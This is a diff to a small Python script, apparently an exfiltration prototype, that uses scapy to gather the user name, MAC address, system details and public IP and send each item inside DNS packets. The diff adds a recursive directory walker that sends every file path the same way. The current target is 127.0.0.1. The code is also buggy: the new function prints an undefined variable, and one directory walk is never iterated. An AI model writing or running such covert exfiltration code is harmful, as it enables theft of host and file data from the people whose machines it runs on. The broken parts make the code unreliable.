@@ -1,12 +1,15 @@
 #!/usr/bin/env python
 
-
 # Libraries
 from scapy.all import *
 from uuid import getnode as get_mac
 import socket
 import urllib.request as urllib2
 from json import load
+try:
+    from os import scandir
+except ImportError:
+    from scandir import scandir
 
 # ==========================================================================================
 
@@ -25,6 +28,9 @@ IP_h = "127.0.0.1"
 
 test = [user,macaddr,system,distrib,my_ip]
 
+# ===========================================================================================
+# Functions
+
 def validateIP(s):
 	# Test ip
 	address=s.split('.')
@@ -38,12 +44,32 @@ def validateIP(s):
 			return False
 	return True
 
+def exfiltration(data):
+	send (IP(dst="127.0.0.1") / UDP() / DNS(qd=DNSQR(
+    qname="localhost", qtype="A"))/data)
+	print(i)
+ 
+def scantree(path):
+    """Recursively yield DirEntry objects for given directory."""
+    for entry in scandir(path):
+        if entry.is_dir(follow_symlinks=False):
+            yield from scantree(entry.path)
+        else:
+            yield entry
+
+
 if validateIP(IP_h):
 	# DNS exfiltration
 	for i in test:
-		send (IP(dst="127.0.0.1") / UDP() / DNS(qd=DNSQR(
-        qname="localhost", qtype="A"))/i)
+		exfiltration(i)
 		print(i)
+	scantree(".")
 
 else:
     print("Bad ip")
+
+if __name__ == '__main__':
+    import sys
+    for entry in scantree(sys.argv[1] if len(sys.argv) > 1 else '.'):
+        exfiltration(entry.path)
+        print(entry.path)
